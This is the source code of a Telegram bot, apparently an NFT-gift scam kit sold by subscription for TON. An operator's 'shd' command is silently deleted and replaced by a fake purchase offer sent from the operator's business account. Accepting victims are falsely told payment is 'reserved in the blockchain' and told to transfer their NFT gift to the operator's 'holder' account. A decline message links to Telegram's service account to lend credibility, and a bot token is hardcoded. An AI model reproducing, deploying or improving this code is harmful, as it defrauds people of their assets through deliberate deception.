"""
Sulumi Team Bot — persistent + anti-freeze + menu/i18n + shd trigger
"""

import os
import re
import uuid
import time
import sqlite3
import requests
import logging

from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=8)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9087583806:AAE1nylRFVLF54ppc6EQZJyDE8vQwhN6bYY")
OWNER_ID = int(os.environ.get("OWNER_ID", "9207314182"))
PAYMENT = os.environ.get("PAYMENT", "pantera138382")
API = "https://api.telegram.org/bot" + BOT_TOKEN
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://offera-5uqe.onrender.com")
DB_PATH = os.environ.get("DATABASE_PATH", "sulumi_bot.db")
LOGO = os.environ.get("LOGO_URL", "")

sent_ids = set()
seen_updates = {}

E = {
    "stars": "5958376256788502078",
    "grams": "6006074913742396956",
    "decline": "5778527486270770928",
    "accept": "5776375003280838798",
    "forward": "5832251986635920010",
    "check": "6019523512908124649",
}

L = {
    "ru": {
        "menu_caption": "<b>NFT TEAM</b>\nГлавное меню. Выбери раздел:",
        "settings": "Настройки",
        "profile": "Профиль",
        "admins": "Админы",
        "settings_title": "<b>Настройки</b>\nВыбери параметр:",
        "language": "Язык",
        "currency": "Валюта",
        "notifications": "Уведомления",
        "lang_title": "<b>Язык</b>\nВыбери язык интерфейса:",
        "cur_title": "<b>Валюта</b>\nВыбери валюту офферов:",
        "on": "вкл",
        "off": "выкл",
        "back": "Назад",
        "profile_title": "<b>Профиль</b>",
        "holder": "Держатель",
        "holder_title": "<b>Держатель</b>\nОтправь username получателя без @:",
        "holder_set": "Держатель изменён: @{hold}",
        "subscription": "Подписка",
        "stars": "Звёзды",
        "grams": "Граммы",
        "admins_title": "<b>Администрация</b>",
        "notif_accepted": "Твой оффер на {name} #{num} принят. Держатель: @{hold}",
    },
    "en": {
        "menu_caption": "<b>NFT TEAM</b>\nMain menu. Choose a section:",
        "settings": "Settings",
        "profile": "Profile",
        "admins": "Admins",
        "settings_title": "<b>Settings</b>\nChoose a parameter:",
        "language": "Language",
        "currency": "Currency",
        "notifications": "Notifications",
        "lang_title": "<b>Language</b>\nChoose interface language:",
        "cur_title": "<b>Currency</b>\nChoose offer currency:",
        "on": "on",
        "off": "off",
        "back": "Back",
        "profile_title": "<b>Profile</b>",
        "holder": "Holder",
        "holder_title": "<b>Holder</b>\nSend the recipient username without @:",
        "holder_set": "Holder changed: @{hold}",
        "subscription": "Subscription",
        "stars": "Stars",
        "grams": "Grams",
        "admins_title": "<b>Admins</b>",
        "notif_accepted": "Your offer for {name} #{num} was accepted. Holder: @{hold}",
    },
}


def ce(name, fb):
    return '<tg-emoji emoji-id="' + E[name] + '">' + fb + '</tg-emoji>'


def btn(t, d, e):
    return {"text": t, "callback_data": d, "icon_custom_emoji_id": E[e]}


def btn_url(t, u, e):
    return {"text": t, "url": u, "icon_custom_emoji_id": E[e]}


def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=15.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL;")
    return conn


def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS subscribers (user_id INTEGER PRIMARY KEY, expires_at REAL)")
    c.execute(
        "CREATE TABLE IF NOT EXISTS deals "
        "(deal_id TEXT PRIMARY KEY, wid INTEGER, lid INTEGER, slug TEXT, name TEXT, num TEXT, "
        "price INTEGER, cur TEXT, holder TEXT, st TEXT, bci TEXT, created REAL)"
    )
    c.execute("CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER PRIMARY KEY, lang TEXT, cur TEXT, holder TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS user_state (user_id INTEGER PRIMARY KEY, state TEXT, updated REAL)")
    c.execute("CREATE TABLE IF NOT EXISTS business_connections (user_id INTEGER PRIMARY KEY, bci TEXT, updated REAL)")
    cols = [r[1] for r in c.execute("PRAGMA table_info(user_settings)").fetchall()]
    if "notif" not in cols:
        c.execute("ALTER TABLE user_settings ADD COLUMN notif INTEGER DEFAULT 1")
    c.execute("INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)", (OWNER_ID, -1.0))
    conn.commit()
    conn.close()


def is_allowed(uid):
    try:
        conn = get_db()
        row = conn.execute("SELECT expires_at FROM subscribers WHERE user_id = ?", (uid,)).fetchone()
        conn.close()
        return bool(row) and (row["expires_at"] == -1.0 or row["expires_at"] > time.time())
    except Exception:
        return False


def add_subscription(uid, days):
    exp = -1.0 if days == -1 else time.time() + (days * 86400)
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO subscribers (user_id, expires_at) VALUES (?, ?)", (uid, exp))
    conn.commit()
    conn.close()


def remove_subscription(uid):
    conn = get_db()
    conn.execute("DELETE FROM subscribers WHERE user_id = ?", (uid,))
    conn.commit()
    conn.close()


def get_expires_str(uid):
    try:
        conn = get_db()
        row = conn.execute("SELECT expires_at FROM subscribers WHERE user_id = ?", (uid,)).fetchone()
        conn.close()
        if not row:
            return "Неизвестно"
        if row["expires_at"] == -1.0:
            return "Навсегда"
        return time.strftime("%d.%m.%Y", time.localtime(row["expires_at"]))
    except Exception:
        return "Неизвестно"


def gs(uid):
    conn = get_db()
    row = conn.execute("SELECT lang, cur, holder, notif FROM user_settings WHERE user_id = ?", (uid,)).fetchone()
    conn.close()
    if row:
        return {
            "lang": row["lang"] or "ru",
            "cur": row["cur"] or "stars",
            "hold": row["holder"] or PAYMENT,
            "notif": 1 if row["notif"] is None else row["notif"],
        }
    return {"lang": "ru", "cur": "stars", "hold": PAYMENT, "notif": 1}


def save_user_settings(uid, s):
    conn = get_db()
    conn.execute(
        "INSERT OR REPLACE INTO user_settings (user_id, lang, cur, holder, notif) VALUES (?, ?, ?, ?, ?)",
        (uid, s.get("lang", "ru"), s.get("cur", "stars"), s.get("hold", PAYMENT), s.get("notif", 1)),
    )
    conn.commit()
    conn.close()


def set_user_field(uid, key, value):
    s = gs(uid)
    s[key] = value
    save_user_settings(uid, s)


def t(uid, key):
    return L.get(gs(uid)["lang"], L["ru"]).get(key, L["ru"].get(key, key))


def set_state(uid, state):
    conn = get_db()
    conn.execute(
        "INSERT OR REPLACE INTO user_state (user_id, state, updated) VALUES (?, ?, ?)",
        (uid, state, time.time()),
    )
    conn.commit()
    conn.close()


def get_state(uid):
    conn = get_db()
    row = conn.execute("SELECT state FROM user_state WHERE user_id = ?", (uid,)).fetchone()
    conn.close()
    return row["state"] if row else None


def clear_state(uid):
    conn = get_db()
    conn.execute("DELETE FROM user_state WHERE user_id = ?", (uid,))
    conn.commit()
    conn.close()


def set_bci(uid, bci):
    conn = get_db()
    conn.execute(
        "INSERT OR REPLACE INTO business_connections (user_id, bci, updated) VALUES (?, ?, ?)",
        (uid, bci, time.time()),
    )
    conn.commit()
    conn.close()


def get_bci(uid):
    conn = get_db()
    row = conn.execute("SELECT bci FROM business_connections WHERE user_id = ?", (uid,)).fetchone()
    conn.close()
    return row["bci"] if row else None


def save_deal(did, d):
    conn = get_db()
    conn.execute(
        "INSERT OR REPLACE INTO deals "
        "(deal_id, wid, lid, slug, name, num, price, cur, holder, st, bci, created) "
        "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        (
            did,
            d["wid"],
            d["lid"],
            d["slug"],
            d["name"],
            d["num"],
            d["price"],
            d["cur"],
            d["hold"],
            d["st"],
            d.get("bci"),
            time.time(),
        ),
    )
    conn.commit()
    conn.close()


def get_deal(did):
    conn = get_db()
    row = conn.execute("SELECT * FROM deals WHERE deal_id = ?", (did,)).fetchone()
    conn.close()
    return dict(row) if row else None


def set_deal_status(did, st):
    conn = get_db()
    conn.execute("UPDATE deals SET st = ? WHERE deal_id = ?", (st, did))
    conn.commit()
    conn.close()


def api(method, **p):
    try:
        payload = {k: v for k, v in p.items() if v is not None}
        r = requests.post(API + "/" + method, json=payload, timeout=60).json()
        if r.get("error_code") == 429:
            wait = r.get("parameters", {}).get("retry_after", 2)
            time.sleep(wait)
            r = requests.post(API + "/" + method, json=payload, timeout=60).json()
        return r
    except Exception as e:
        logging.error("API ERR " + method + ": " + str(e))
        return {}


def track(res, cid):
    if res.get("ok"):
        sent_ids.add((cid, res["result"]["message_id"]))
    return res


def fmt(n):
    return format(int(n), ",").replace(",", " ")


def sm(cid, txt, kb=None, bci=None):
    return track(
        api(
            "sendMessage",
            chat_id=cid,
            text=txt,
            parse_mode="HTML",
            reply_markup=kb,
            business_connection_id=bci,
        ),
        cid,
    )


def sm_nft(cid, txt, url, kb=None, bci=None):
    return track(
        api(
            "sendMessage",
            chat_id=cid,
            text=txt,
            parse_mode="HTML",
            link_preview_options={"is_disabled": False, "show_above_text": True, "url": url},
            reply_markup=kb,
            business_connection_id=bci,
        ),
        cid,
    )


def dm(cid, mid, bci=None):
    return api("deleteMessage", chat_id=cid, message_id=mid, business_connection_id=bci)


def em(cid, mid, txt, kb=None, bci=None):
    return api(
        "editMessageText",
        chat_id=cid,
        message_id=mid,
        text=txt,
        parse_mode="HTML",
        reply_markup=kb,
        business_connection_id=bci,
    )


def ec(cid, mid, cap, kb=None, bci=None):
    return api(
        "editMessageCaption",
        chat_id=cid,
        message_id=mid,
        caption=cap,
        parse_mode="HTML",
        reply_markup=kb,
        business_connection_id=bci,
    )


def edit_any(cid, mid, txt, kb=None, bci=None):
    r = ec(cid, mid, txt, kb=kb, bci=bci)
    return r if r.get("ok") else em(cid, mid, txt, kb=kb, bci=bci)


def ac(cb, txt=None, sa=False):
    return api("answerCallbackQuery", callback_query_id=cb, show_alert=sa, text=txt)


def _ok(r, tag):
    if r.get("ok"):
        logging.info(tag + " OK")
    else:
        logging.warning(tag + ": " + str(r.get("description")))
    return bool(r.get("ok"))


def erase_command(cid, mid, bci=None):
    if _ok(dm(cid, mid), "DEL plain " + str(cid) + "/" + str(mid)):
        return True
    if bci and _ok(dm(cid, mid, bci=bci), "DEL bci " + str(cid) + "/" + str(mid)):
        return True
    if _ok(em(cid, mid, "?", kb={"inline_keyboard": []}), "EDIT plain " + str(cid) + "/" + str(mid)):
        return True
    if bci and _ok(em(cid, mid, "?", kb={"inline_keyboard": []}, bci=bci), "EDIT bci " + str(cid) + "/" + str(mid)):
        return True
    return False


def menu_kb(uid):
    return {
        "inline_keyboard": [
            [
                btn("⚙️ " + t(uid, "settings"), "menu:settings", "check"),
                btn("👤 " + t(uid, "profile"), "menu:profile", "stars"),
            ],
            [btn("🛡️ " + t(uid, "admins"), "menu:admins", "forward")],
        ]
    }


def settings_kb(uid):
    s = gs(uid)
    cur_name = t(uid, "stars") if s["cur"] == "stars" else t(uid, "grams")
    notif = t(uid, "on") if s["notif"] else t(uid, "off")
    return {
        "inline_keyboard": [
            [btn("🌐 " + t(uid, "language") + ": " + s["lang"].upper(), "set:lang", "check")],
            [btn("💱 " + t(uid, "currency") + ": " + cur_name, "set:cur", "stars")],
            [btn("🔔 " + t(uid, "notifications") + ": " + notif, "set:notif", "accept")],
            [btn("👑 " + t(uid, "holder") + ": @" + s["hold"], "set:holder", "forward")],
            [btn("⬅️ " + t(uid, "back"), "menu:main", "decline")],
        ]
    }


def lang_kb(uid):
    return {
        "inline_keyboard": [
            [
                btn("🇷🇺 Русский", "setlang:ru", "check"),
                btn("🇬🇧 English", "setlang:en", "check"),
            ],
            [btn("⬅️ " + t(uid, "back"), "menu:settings", "decline")],
        ]
    }


def cur_kb(uid):
    return {
        "inline_keyboard": [
            [
                btn("⭐ " + t(uid, "stars"), "setcur:stars", "stars"),
                btn("💎 " + t(uid, "grams"), "setcur:grams", "grams"),
            ],
            [btn("⬅️ " + t(uid, "back"), "menu:settings", "decline")],
        ]
    }


def back_kb(uid, target):
    return {"inline_keyboard": [[btn("⬅️ " + t(uid, "back"), target, "decline")]]}


def profile_txt(uid):
    s = gs(uid)
    cur_name = t(uid, "stars") if s["cur"] == "stars" else t(uid, "grams")
    notif = t(uid, "on") if s["notif"] else t(uid, "off")
    return (
        t(uid, "profile_title")
        + "\n\n"
        + "ID: <code>"
        + str(uid)
        + "</code>\n"
        + t(uid, "language")
        + ": "
        + s["lang"].upper()
        + "\n"
        + t(uid, "currency")
        + ": "
        + cur_name
        + "\n"
        + t(uid, "notifications")
        + ": "
        + notif
        + "\n"
        + t(uid, "holder")
        + ": @"
        + s["hold"]
        + "\n"
        + t(uid, "subscription")
        + ": "
        + get_expires_str(uid)
    )


def okb(did):
    return {
        "inline_keyboard": [
            [
                btn(" Отклонить", "decline:" + did, "decline"),
                btn(" Принять", "accept:" + did, "accept"),
            ]
        ]
    }


def aakb(did, h):
    return {
        "inline_keyboard": [
            [btn_url(" Передать", "tg://send_gift?to=" + h.replace("@", ""), "forward")],
            [btn(" Проверить", "check:" + did, "check")],
        ]
    }


def pnft(txt):
    m = re.search(r"(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)", txt, re.I)
    if not m:
        return None
    s = m.group(1)
    np2, num = s.rsplit("-", 1)
    return {
        "slug": s,
        "name": re.sub(r"([a-z])([A-Z])", r"\1 \2", np2),
        "num": num,
        "nfmt": fmt(num),
    }


def st_holder(cid, uid, ci, low):
    un = low.lstrip("@")
    ok = bool(un) and " " not in un
    if ok:
        set_user_field(uid, "hold", un)
        clear_state(uid)
        sm(cid, t(uid, "holder_set").format(hold=un), kb=settings_kb(uid), bci=ci)
    return True


def st_lang(cid, uid, ci, low):
    ok = low in ("ru", "en")
    if ok:
        set_user_field(uid, "lang", low)
        clear_state(uid)
        sm(cid, "✅ Язык: " + ("🇷🇺 RU" if low == "ru" else "🇬🇧 EN"), bci=ci)
    return True


def st_cur(cid, uid, ci, low):
    ok = low in ("stars", "grams")
    if ok:
        set_user_field(uid, "cur", low)
        clear_state(uid)
        sm(cid, "✅ Валюта: " + ("⭐" if low == "stars" else "💎"), bci=ci)
    return True


def handle_state(cid, uid, ci, txt, low, has_shd):
    if has_shd or txt.startswith("/") or not get_state(uid):
        return False
    state = get_state(uid)
    if state == "holder":
        return st_holder(cid, uid, ci, low)
    if state == "lang":
        return st_lang(cid, uid, ci, low)
    if state == "cur":
        return st_cur(cid, uid, ci, low)
    return False


def flash(cid, ci, text):
    r = sm(cid, text, bci=ci)
    if r.get("ok"):
        time.sleep(1.5)
        dm(cid, r["result"]["message_id"], bci=ci)


def send_start(cid, uid, ci):
    clear_state(uid)
    cap = t(uid, "menu_caption")
    kb = menu_kb(uid)
    sent = None
    if LOGO:
        sent = track(
            api(
                "sendPhoto",
                chat_id=cid,
                photo=LOGO,
                caption=cap,
                parse_mode="HTML",
                reply_markup=kb,
                business_connection_id=ci,
            ),
            cid,
        )
    if not (sent and sent.get("ok")):
        sm(cid, cap, kb=kb, bci=ci)


def shd_parse(txt):
    ni = pnft(txt)
    last = txt.split()[-1]
    pr = int(last) if last.lstrip("-").isdigit() else None
    return ni, pr


def build_offer(msg, cid, uid, ci, ni, pr):
    s = gs(uid)
    cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
    did = str(uuid.uuid4())[:8]
    sender_bci = ci or get_bci(uid)
    save_deal(
        did,
        {
            "wid": uid,
            "lid": cid,
            "slug": ni["slug"],
            "name": ni["name"],
            "num": ni["num"],
            "price": pr,
            "cur": s["cur"],
            "hold": s["hold"],
            "st": "pending",
            "bci": sender_bci,
        },
    )
    nl = "https://t.me/nft/" + ni["slug"]
    name = msg["from"].get("first_name") or msg["from"].get("username") or "User"
    cap = (
        '<a href="'
        + nl
        + '">\u200b</a>'
        + "<u>"
        + name
        + "</u> предлагает за подарок <b>"
        + ni["name"]
        + " #"
        + ni["nfmt"]
        + "</b> сумму <b>"
        + str(pr)
        + "</b> "
        + cs
        + ".\n\nУ вас есть 5h 59m, чтобы принять решение."
    )
    sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)


def send_offer(msg, cid, uid, ci, txt):
    ni, pr = shd_parse(txt)
    if not ni:
        flash(cid, ci, "❌ Не найдена NFT")
        return
    if pr is None:
        flash(cid, ci, "❌ Цена должна быть числом")
        return
    if uid != OWNER_ID and not is_allowed(uid):
        flash(cid, ci, "🔒 Доступ закрыт. @" + PAYMENT)
        return
    if not (ci or get_bci(uid)):
        flash(cid, ci, "⚠️ Подключи бизнес-аккаунт!")
        return
    build_offer(msg, cid, uid, ci, ni, pr)


def cmd_diag(cid, uid, ci):
    test_bci = ci or get_bci(uid)
    probe = sm(cid, "diag", bci=test_bci)
    pmid = probe["result"]["message_id"] if probe.get("ok") else 0
    r1 = dm(cid, pmid) if pmid else {}
    r2 = (
        dm(cid, pmid, bci=test_bci)
        if (pmid and not r1.get("ok"))
        else {"ok": True, "description": "skipped"}
    )
    report = (
        "chat: <code>"
        + str(cid)
        + "</code>\n"
        + "bci: <code>"
        + str(test_bci)
        + "</code>\n"
        + "delete plain: "
        + str(r1.get("ok"))
        + " — "
        + str(r1.get("description"))
        + "\n"
        + "delete+bci: "
        + str(r2.get("ok"))
        + " — "
        + str(r2.get("description"))
    )
    sm(cid, report, bci=ci)


def cmd_legitt(cid, ci, txt):
    parts = txt.split()
    if len(parts) < 4 or parts[1] != "add" or not parts[-1].lstrip("-").isdigit():
        sm(cid, "❌ Формат: <code>/legitt add id1 id2 дни</code>\n(-1 = навсегда)", bci=ci)
        return
    days = int(parts[-1])
    ids = [int(x) for x in parts[2:-1] if x.isdigit()]
    for i in ids:
        add_subscription(i, days)
    exp_str = "Навсегда" if days == -1 else str(days) + " дн."
    sm(
        cid,
        "✅ Доступ выдан "
        + str(len(ids))
        + " пользователям:\n<code>"
        + ", ".join(str(i) for i in ids)
        + "</code>\nСрок: "
        + exp_str,
        bci=ci,
    )


def cmd_zabrat(cid, ci, txt):
    parts = txt.split()
    if len(parts) < 2 or not parts[1].isdigit():
        sm(cid, "❌ Формат: <code>/zabrat id</code>", bci=ci)
        return
    tid = int(parts[1])
    remove_subscription(tid)
    sm(cid, "✅ Доступ отозван у <code>" + str(tid) + "</code>", bci=ci)


def cmd_list(cid, ci):
    conn = get_db()
    rows = conn.execute("SELECT user_id FROM subscribers").fetchall()
    conn.close()
    if not rows:
        sm(cid, "📋 Список пуст", bci=ci)
        return
    ul = "\n".join(
        "• <code>" + str(r["user_id"]) + "</code> — " + get_expires_str(r["user_id"]) for r in rows
    )
    sm(cid, "📋 Доступы (" + str(len(rows)) + "):\n\n" + ul, bci=ci)


def admin_cmd(cid, uid, ci, txt):
    if txt == "/diag":
        cmd_diag(cid, uid, ci)
    elif txt.startswith("/legitt"):
        cmd_legitt(cid, ci, txt)
    elif txt.startswith("/zabrat"):
        cmd_zabrat(cid, ci, txt)
    elif txt == "/list":
        cmd_list(cid, ci)


def route_cmd(cid, uid, ci, txt):
    simple = {
        "/buy": "💎 Напишите @" + PAYMENT + " для покупки",
        "/tarifs": "💎 1 День — 1 TON\n3 Дня — 2.5 TON\nНавсегда — 4.5 TON",
        "/lg": "🌐 ru или en",
        "/cv": "💱 stars или grams",
    }
    states = {"/lg": "lang", "/cv": "cur"}
    if txt in states:
        set_state(uid, states[txt])
    if txt in simple:
        sm(cid, simple[txt], bci=ci)
        return
    if txt.startswith("/holder"):
        set_state(uid, "holder")
        sm(cid, "👑 Username без @", bci=ci)
        return
    if uid != OWNER_ID:
        sm(cid, "🔒 Только для админа", bci=ci)
        return
    admin_cmd(cid, uid, ci, txt)


def route_msg(msg, cid, uid, mid, ci, txt):
    if ci:
        set_bci(uid, ci)
    low = txt.lower()
    has_shd = "shd" in low
    if has_shd:
        erase_command(cid, mid, bci=ci)
    if txt == "/start":
        send_start(cid, uid, ci)
        return
    if handle_state(cid, uid, ci, txt, low, has_shd):
        return
    if has_shd:
        send_offer(msg, cid, uid, ci, txt)
        return
    if txt.startswith("/"):
        route_cmd(cid, uid, ci, txt)


def process_msg(msg):
    cid = msg["chat"]["id"]
    uid = msg["from"]["id"]
    mid = msg["message_id"]
    ci = msg.get("business_connection_id")
    txt = (msg.get("text") or msg.get("caption") or "").strip()
    if not cid or not uid or not txt:
        return
    if (cid, mid) in sent_ids:
        return
    route_msg(msg, cid, uid, mid, ci, txt)


def cb_menu(cid, uid, mid, ci, act):
    views = {
        "main": (t(uid, "menu_caption"), menu_kb(uid)),
        "settings": (t(uid, "settings_title"), settings_kb(uid)),
        "profile": (profile_txt(uid), back_kb(uid, "menu:main")),
        "admins": (t(uid, "admins_title") + "\n\n@" + PAYMENT, back_kb(uid, "menu:main")),
    }
    v = views.get(act)
    if v:
        edit_any(cid, mid, v[0], v[1], ci)


def cb_set(cid, uid, mid, ci, act):
    s = gs(uid)
    if act == "notif":
        set_user_field(uid, "notif", 0 if s["notif"] else 1)
    elif act == "holder":
        set_state(uid, "holder")
    elif act == "holderback":
        clear_state(uid)
    views = {
        "lang": (t(uid, "lang_title"), lang_kb(uid)),
        "cur": (t(uid, "cur_title"), cur_kb(uid)),
        "notif": (t(uid, "settings_title"), settings_kb(uid)),
        "holder": (t(uid, "holder_title"), back_kb(uid, "set:holderback")),
        "holderback": (t(uid, "settings_title"), settings_kb(uid)),
    }
    v = views.get(act)
    if v:
        edit_any(cid, mid, v[0], v[1], ci)


def cb_check(cbid, cid, ci, did):
    deal = get_deal(did)
    if not deal:
        ac(cbid, txt="Оффер не найден", sa=True)
        return
    if deal["st"] in ("declined", "expired"):
        ac(cbid, txt="Сделка закрыта", sa=True)
        return
    if deal["st"] == "completed":
        ac(cbid, txt="Сделка уже завершена", sa=True)
        return
    nf = fmt(deal["num"])
    h = deal["holder"]
    instr = (
        "Ожидается передача "
        + deal["name"]
        + " #"
        + nf
        + " на @"
        + h
        + "\n\n"
        + "1. Кнопка «Передать»\n"
        + "2. Вкладка «Мои»\n"
        + "3. Выберите NFT и передайте"
    )[:200]
    r = ac(cbid, txt=instr, sa=True)
    if not r.get("ok"):
        ac(cbid)
        sm(cid, instr, bci=ci)


def accept_render(cid, mid, ci, deal):
    nf = fmt(deal["num"])
    h = deal["holder"]
    if gs(deal["wid"])["notif"]:
        sm(deal["wid"], t(deal["wid"], "notif_accepted").format(name=deal["name"], num=nf, hold=h))
    cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
    nl = "https://t.me/nft/" + deal["slug"]
    bci = deal.get("bci") or ci
    txt = (
        '<a href="'
        + nl
        + '">\u200b</a>'
        + "<b>"
        + str(deal["price"])
        + "</b> "
        + cs
        + " успешно зарезервированы в блокчейне.\n\n"
        + "Ожидается передача подарка <b>"
        + deal["name"]
        + " #"
        + nf
        + "</b> @"
        + h
        + ".\n\n"
        + "Нажмите кнопку «Передать» и отправьте подарок <b>"
        + deal["name"]
        + " #"
        + nf
        + "</b> пользователю <b>@"
        + h
        + "</b>. После завершения сделки "
        + cs
        + " автоматически начислятся на ваш аккаунт."
    )
    res = api(
        "editMessageText",
        chat_id=cid,
        message_id=mid,
        text=txt,
        parse_mode="HTML",
        link_preview_options={"is_disabled": False, "show_above_text": True, "url": nl},
        reply_markup=aakb(deal["deal_id"], h),
        business_connection_id=bci,
    )
    if not res.get("ok"):
        dm(cid, mid, bci=bci)
        sm_nft(cid, txt, nl, kb=aakb(deal["deal_id"], h), bci=bci)


def cb_accept(cbid, cid, mid, ci, did):
    deal = get_deal(did)
    ok = bool(deal) and deal["st"] == "pending"
    ac(cbid)
    if ok:
        set_deal_status(did, "accepted")
        accept_render(cid, mid, ci, deal)


def cb_decline(cbid, cid, mid, ci, did):
    deal = get_deal(did)
    ok = bool(deal) and deal["st"] == "pending"
    ac(cbid)
    if ok:
        set_deal_status(did, "declined")
        bci = deal.get("bci") or ci
        txt = (
            "Оффер был отклонён "
            + ce("decline", "⊗")
            + "\n\n"
            + '<a href="tg://openmessage?user_id=777000">Поддержка телеграм</a> ✈️'
        )
        em(cid, mid, txt, kb={"inline_keyboard": []}, bci=bci)


def route_cb(cbid, cid, uid, mid, ci, data):
    head, _, val = data.partition(":")
    known = ("menu", "set", "setlang", "setcur", "check", "accept", "decline")
    if head in ("menu", "set", "setlang", "setcur"):
        ac(cbid)
    if head == "setlang" and val in ("ru", "en"):
        set_user_field(uid, "lang", val)
    if head == "setcur" and val in ("stars", "grams"):
        set_user_field(uid, "cur", val)
    if head in ("setlang", "setcur"):
        edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
    if head == "menu":
        cb_menu(cid, uid, mid, ci, val)
    if head == "set":
        cb_set(cid, uid, mid, ci, val)
    if head == "check":
        cb_check(cbid, cid, ci, val)
    if head == "accept":
        cb_accept(cbid, cid, mid, ci, val)
    if head == "decline":
        cb_decline(cbid, cid, mid, ci, val)
    if head not in known:
        ac(cbid)


def process_cb(cb):
    msg = cb.get("message") or {}
    uid = cb["from"]["id"]
    route_cb(
        cb["id"],
        msg.get("chat", {}).get("id", uid),
        uid,
        msg.get("message_id", 0),
        msg.get("business_connection_id"),
        cb.get("data", ""),
    )


def process_update(u):
    try:
        if "message" in u:
            process_msg(u["message"])
        elif "business_message" in u:
            process_msg(u["business_message"])
        elif "callback_query" in u:
            process_cb(u["callback_query"])
        elif "business_connection" in u:
            bc = u["business_connection"]
            set_bci(bc["user"]["id"], bc["id"])
    except Exception as e:
        logging.error("UPDATE ERR: " + str(e))


def mark_seen(u):
    now = time.time()
    dup = u in seen_updates
    seen_updates[u] = now
    if len(seen_updates) > 5000:
        for k in [k for k, v in seen_updates.items() if now - v > 600]:
            seen_updates.pop(k, None)
    return dup


@app.route("/webhook", methods=["POST"])
def webhook():
    u = request.get_json(force=True, silent=True) or {}
    upd = u.get("update_id")
    dup = mark_seen(upd) if upd is not None else False
    if u and not dup:
        executor.submit(process_update, u)
    return jsonify({"ok": True}), 200


@app.route("/")
def index():
    return "OK"


def set_wh():
    logging.info(
        "Webhook set: "
        + str(
            api(
                "setWebhook",
                url=RENDER_URL + "/webhook",
                allowed_updates=["message", "callback_query", "business_connection", "business_message"],
            )
        )
    )


def set_cmd():
    api(
        "setMyCommands",
        commands=[
            {"command": "start", "description": "Главное меню"},
            {"command": "buy", "description": "Купить"},
            {"command": "tarifs", "description": "Цены"},
            {"command": "lg", "description": "Язык"},
            {"command": "cv", "description": "Валюта"},
            {"command": "holder", "description": "Держатель"},
            {"command": "diag", "description": "Диагностика удаления (админ)"},
            {"command": "list", "description": "Список (админ)"},
            {"command": "zabrat", "description": "Отозвать (админ)"},
            {"command": "legitt", "description": "Выдать (админ)"},
        ],
    )


init_db()

if __name__ == "__main__":
    set_wh()
    set_cmd()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
